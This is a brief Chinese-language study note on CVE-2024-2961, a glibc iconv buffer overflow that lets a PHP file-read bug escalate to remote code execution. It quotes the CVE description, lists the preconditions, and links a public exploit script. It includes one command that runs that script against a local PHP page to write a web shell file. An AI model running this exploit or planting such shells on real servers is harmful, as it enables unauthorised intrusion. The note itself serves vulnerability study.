# CVE-2024-2961

由iconv引起的的缓冲区溢出漏洞导致的从php文件读取到RCE的漏洞，文章是[Iconv，将字符集设置为 RCE：利用 glibc 破解 PHP 引擎（第 1 部分） --- Iconv, set the charset to RCE: Exploiting the glibc to hack the PHP engine (part 1)](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)，关于缓冲区溢出的那部分没有看太懂。



关于CVE的漏洞描述是：

> **字符串转换为 ISO-2022-CN-EXT 字符集时，GNU C 库版本 2.39 及更早版本中的 iconv() 函数可能会溢出传递给它的输出缓冲区最多 4 个字节，这可能会导致应用程序崩溃或覆盖相邻变量。**



因此要求iconv版本<=2.39且存在一个有回显且可控的文件读取。



```bash
python cnext-exploit.py http://127.0.0.1:8080/index.php "echo '<?=phpinfo();?>' > shell.php"
```





具体的环境可以根据具体情况修改exp脚本：[raw.githubusercontent.com/ambionics/cnext-exploits/main/cnext-exploit.py](https://raw.githubusercontent.com/ambionics/cnext-exploits/main/cnext-exploit.py)

